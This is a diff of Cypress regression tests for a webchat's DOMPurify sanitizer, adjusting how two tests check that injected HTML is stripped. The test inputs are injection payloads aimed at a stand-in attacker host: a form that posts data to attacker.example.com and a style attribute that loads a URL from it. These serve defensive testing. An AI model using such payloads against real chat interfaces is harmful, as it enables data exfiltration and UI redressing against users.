@@ -46,7 +46,8 @@ describe("sanitize — DOMPurify allow-list hardening (WCH-SI10-001)", () => {
 	it("strips <form> (was in allow-list — posts user data to attacker URL)", () => {
 		init();
 		typeAndSend('<form action="https://attacker.example.com"><input name="q"></form>');
-		cy.get("[data-cognigy-webchat-root]").find("form").should("not.exist");
+		// Scope to chat history — the webchat input itself contains a <form> element
+		cy.get(".webchat-chat-history").find("form").should("not.exist");
 	});
 
 	it("strips <object> (was in allow-list — loads arbitrary external content)", () => {
@@ -96,7 +97,10 @@ describe("sanitize — DOMPurify allow-list hardening (WCH-SI10-001)", () => {
 	it("strips style attribute (inline CSS injection and UI redressing)", () => {
 		init();
 		typeAndSend('<span style="background:url(https://attacker.example.com)">text</span>');
-		cy.get("[data-cognigy-webchat-root]").find("[style]").should("not.exist");
+		// Match the injected value specifically — the webchat itself uses inline styles via Emotion
+		cy.get("[data-cognigy-webchat-root]")
+			.find('[style*="attacker.example.com"]')
+			.should("not.exist");
 	});
 
 	// --- regression guards ---
